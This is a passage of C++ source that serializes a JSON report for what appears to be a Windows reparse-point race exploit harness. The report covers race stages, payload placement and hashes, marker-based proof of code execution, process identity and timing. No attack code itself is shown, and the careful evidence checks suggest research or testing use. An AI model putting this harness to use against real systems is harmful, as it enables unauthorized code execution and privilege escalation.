      completeRaceEvidence && isExecution && result.markerVerified &&
      result.markerRecordValid && markerLocationTrusted &&
      result.executionState == ExecutionState::Confirmed &&
      result.executionIdentityMatch && !result.experimentNonce.empty() &&
      result.codeExecNonce == result.experimentNonce;
  if (isExecution && result.markerVerified) {
    out << "\"status\":\""
        << (codeExecutionProven
                ? "proven"
                : !result.markerRecordValid
                      ? "invalid_marker_record"
                      : !result.executionIdentityMatch
                            ? "observed_identity_mismatch"
                      : "observed_untrusted_marker")
        << "\"";
    out << ",\"marker_parent_create_access\":\""
        << access_test_token(result.markerCreateAccess) << "\"";
    if (!result.markerRecordValid) {
      out << ",\"note\":\"the marker did not contain a complete, target-bound "
             "execution record\"";
    } else if (!result.executionIdentityMatch) {
      out << ",\"note\":\"execution was observed, but the actual identity did "
             "not match the target requirement\"";
    } else if (!markerLocationTrusted) {
      out << ",\"note\":\"the caller can write beside the planted payload, so the "
             "marker is evidence but not independently unforgeable\"";
    }
    out << ",\"process_identity\":{\"sid\":";
    json_output::write_string(out, result.codeExecSid.empty() ? "unknown" : result.codeExecSid);
    out << ",\"process_image\":";
    json_output::write_string(out, result.codeExecProcessImage);
    out << ",\"integrity\":";
    json_output::write_string(out, result.codeExecIntegrity);
    out << ",\"account\":";
    json_output::write_string(out, result.codeExecAccount);
    out << "},\"effective_thread_identity\":{\"impersonating\":"
        << (result.codeExecImpersonating ? "true" : "false");
    if (result.codeExecImpersonating) {
      out << ",\"sid\":";
      json_output::write_string(out, result.codeExecThreadSid);
      out << ",\"integrity\":";
      json_output::write_string(out, result.codeExecThreadIntegrity);
    }
    out << "}";
    out << ",\"expected_identity\":";
    json_output::write_string(out, result.expectedExecutionIdentity);
    out << ",\"identity_scope\":";
    json_output::write_string(out, config.target.execution.identityScope);
    out << ",\"identity_match\":"
        << (result.executionIdentityMatch ? "true" : "false");
    out << ",\"experiment_nonce\":";
    json_output::write_string(out, result.codeExecNonce);
    out << ",\"experiment_nonce_match\":"
        << (result.codeExecNonce == result.experimentNonce ? "true" : "false");
    if (!config.target.execution.markerContains.empty()) {
      out << ",\"marker_required_text\":";
      json_output::write_string(out, config.target.execution.markerContains);
    }
  } else if (isExecution && result.placementConfirmed) {
    out << "\"status\":\"payload_placed_execution_not_confirmed\""
        << ",\"marker_parent_create_access\":\""
        << access_test_token(result.markerCreateAccess) << "\"";
  } else {
    out << "\"status\":\"not_tested\"";
  }
  out << "}";

  out << ",\n  \"outcome_stages\":{"
      << "\"race_success\":"
      << (completeRaceEvidence ? "true" : "false")
      << ",\"placement_success\":"
      << (result.placementConfirmed ? "true" : "false")
      << ",\"execution_state\":\""
      << execution_state_token(result.executionState) << "\""
      << ",\"execution_observed\":"
      << (result.executionObserved ? "true" : "false")
      << ",\"identity_match\":"
      << (result.executionIdentityMatch ? "true" : "false")
      << ",\"effect_stability\":\""
      << (result.effectStabilityUnknown ? "unknown" : "stable_at_check")
      << "\"}";

  if (hasPayload) {
    out << ",\n  \"payload\":{"
        << "\"source\":";
    json_output::write_string(out, run.payloadPath);
    out << ",\"destination\":";
    json_output::write_string(out, run.targetPath);
    out << ",\"preserve_bytes\":"
        << (!config.target.execution.developmentNonceOverlay ? "true" : "false")
        << ",\"sha256\":";
    json_output::write_string(
        out, result.payloadSourceSha256.empty()
                 ? "unavailable" : result.payloadSourceSha256);
    out << ",\"size\":" << result.payloadSourceSize
        << ",\"source_sha256\":";
    json_output::write_string(
        out, result.payloadSourceSha256.empty()
                 ? "unavailable" : result.payloadSourceSha256);
    out << ",\"staged_sha256\":";
    json_output::write_string(
        out, result.payloadStagedSha256.empty()
                 ? "unavailable" : result.payloadStagedSha256);
    out << ",\"destination_sha256\":";
    json_output::write_string(
        out, result.payloadDestinationSha256.empty()
                 ? "unavailable" : result.payloadDestinationSha256);
    out << ",\"source_size\":" << result.payloadSourceSize
        << ",\"staged_size\":" << result.payloadStagedSize
        << ",\"destination_size\":" << result.payloadDestinationSize
        << ",\"exact_copy\":"
        << (result.payloadExactCopy ? "true" : "false")
        << ",\"exact_match\":"
        << (result.payloadExactMatch ? "true" : "false")
        << ",\"source_destination_exact_match\":"
        << (result.payloadExactMatch ? "true" : "false")
        << ",\"development_nonce_overlay\":"
        << (result.payloadDevelopmentNonceOverlay ? "true" : "false")
        << ",\"destination_hash_status\":";
    json_output::write_string(out, result.destinationHashStatus);
    out
        << "}";
  }

  out << ",\n  \"server_completion\":\""
      << server_completion_token(result.serverCompletion) << "\"";
  out << ",\n  \"cleanup_status\":";
  json_output::write_string(out, result.cleanupStatus);
  out << ",\n  \"environment\":{\"os_build\":";
  json_output::write_string(
      out, result.osBuild.empty() ? "unavailable" : result.osBuild);
  out << ",\"caller_sid\":";
  json_output::write_string(
      out, result.callerSid.empty() ? "unknown" : result.callerSid);
  out << ",\"caller_integrity\":";
  json_output::write_string(
      out, result.callerIntegrity.empty()
               ? "unavailable" : result.callerIntegrity);
  out << "}";

  out << ",\n  \"written_file\":{\"owner\":";
  json_output::write_string(out, result.fileOwner.empty() ? "unavailable" : result.fileOwner);
  out << ",\"integrity_label\":";
  json_output::write_string(out,
      result.fileIntegrityLabel.empty() ? "none" : result.fileIntegrityLabel);
  out << ",\"size\":" << result.fileSize << "}";

  const RaceTranscript& t = result.transcript;
  out << ",\n  \"race_transcript_ms\":{\n";
  write_ms(out, "start_to_trigger", t.startToTriggerMs, true);
  write_ms(out, "trigger_to_release", t.triggerToReleaseMs, true);
  write_ms(out, "release_to_bait_gone", t.releaseToBaitGoneMs, true);
  write_ms(out, "bait_gone_to_reparse", t.baitGoneToReparseMs, true);
  write_ms(out, "reparse_to_invoke_return", t.reparseToInvokeReturnMs, true);
  write_ms(out, "start_to_target_check", t.startToTargetCheckMs, true);
  out << "    \"swap_retries\":" << t.swapRetries << "\n  }";

  out << ",\n  \"message\":";
  json_output::write_string(out, result.message);
  out << "\n}\n";
  return out.str();
}

}
